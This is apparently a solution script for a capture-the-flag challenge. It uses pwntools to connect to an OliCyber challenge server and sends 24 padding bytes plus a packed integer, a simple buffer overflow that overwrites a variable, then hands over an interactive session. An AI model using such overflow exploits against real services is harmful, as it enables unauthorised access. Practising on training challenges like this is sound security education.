from pwn import *

r = connect("gtn.challs.olicyber.it", 10022)

r.recvuntil(b":\n")

r.sendline(b"a"*24 + p32(1))

r.interactive()